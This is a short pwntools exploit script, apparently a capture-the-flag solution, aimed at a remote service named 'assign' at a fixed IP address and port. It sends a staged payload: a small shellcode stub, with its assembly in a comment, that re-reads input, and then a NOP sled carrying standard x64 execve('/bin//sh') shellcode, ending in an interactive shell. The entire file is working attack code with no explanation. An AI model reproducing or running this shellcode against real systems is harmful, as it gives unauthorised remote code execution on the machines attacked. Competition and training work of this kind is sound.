from pwn import * 
import time
#s=process("./assign")
#raw_input()
s=remote("13.124.80.124", '6666')
"""
payload1
mov edx, 0x402
add r12, 0x1cd
mov rax, rsi
call r12

r12<-_start address
"""

payload1="\xBA\x02\x04\x00\x00\x49\x81\xC4\xCD\x01\x00\x00\x48\x89\xF0\x41\xFF\xD4"
s.send(payload1+"\n")
time.sleep(1)

"""
payload2= usual x64 shellcode
"""
payload2="\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
s.send("\x90"*(0x402-len(payload2))+payload2+"\n")
s.interactive()
s.close()